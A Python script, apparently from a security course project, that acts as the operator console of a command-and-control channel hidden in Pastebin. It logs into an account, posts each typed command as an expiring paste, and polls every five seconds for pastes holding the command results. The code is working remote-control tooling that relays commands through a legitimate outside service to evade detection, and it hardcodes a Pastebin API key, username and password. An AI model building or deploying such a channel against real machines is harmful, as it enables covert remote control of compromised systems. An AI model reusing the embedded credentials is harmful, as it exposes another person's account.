import requests
import time
import threading

# TODO: make everything use the unique session from login

# Function to login to Pastebin
def login_to_pastebin(api_dev_key, username, password):
    data = {
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password
    }

    session = requests.Session()
    response = session.post("https://pastebin.com/api/api_login.php", data=data)
    if response.status_code == 200:
        return response.text
    else:
        return None

# Function to create a paste on Pastebin
def create_paste(api_user_key, text, title="Untitled"):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_expire_date': '10M',
        'api_paste_code': text,
        'api_paste_name': title
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if response.status_code == 200:
        return response.text
    else:
        return None
    
# Function to retrieve a list of pastes created by the user
def get_user_pastes(api_user_key):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'list',
        'api_results_limit': 10  # Adjust as needed, maximum is 1000
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None
    
# Function to retrieve a paste from Pastebin
def get_pastebin_content(api_user_key, paste_key):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'show_paste',
        'api_paste_key': paste_key
    }
    response = requests.post("https://pastebin.com/api/api_raw.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None

def fetch_latest_key(pastes_data):
    paste_keys = []

    if pastes_data != "No pastes found." and pastes_data is not None:
        strings = [line.split(',')[0] for line in pastes_data.split('\n')]
        expression = "<paste_key>"
        for string in strings:
            string = string.strip()
            if string.startswith(expression):
                paste_keys.append(string[len(expression):len(expression) + 8])

        return paste_keys[0]
    # else:
    #     print(pastes_data)

    return None

def periodically_check_for_response():
    while True:
        latest_key = fetch_latest_key(get_user_pastes(api_user_key))
        if latest_key is not None:
            paste_content = get_pastebin_content(api_user_key, latest_key)
            if paste_content != text_to_upload and paste_content is not None:
                print("Response for command given is: ")
                print(paste_content)
            # else:
            #     print("No new pastes detected from command side")

        time.sleep(5)

# Your Pastebin API Developer Key
api_key = "oI_hBDSnHFHmlCcY_TPqeLmV1GCCxu4E"
# Your Pastebin username and password
username = "frequency2612"
password = "cs564_project"

text_to_upload = None

# Login to Pastebin
api_user_key = login_to_pastebin(api_key, username, password)
if api_user_key:
    print("Successfully logged in to Pastebin.")
else:
    print("Failed to log in to Pastebin.")

print("Starting response monitor thread")
check_thread = threading.Thread(target=periodically_check_for_response)
check_thread.daemon = True
check_thread.start()

# Example: Create a paste
while api_user_key:
    text_to_upload = input("Enter your command: ")
    paste_title = f"Command {time.ctime()}"
    paste_url = create_paste(api_user_key, text_to_upload, paste_title)
    if paste_url:
        print("Paste uploaded successfully. URL:", paste_url)
    else:
        print("Failed to upload paste.")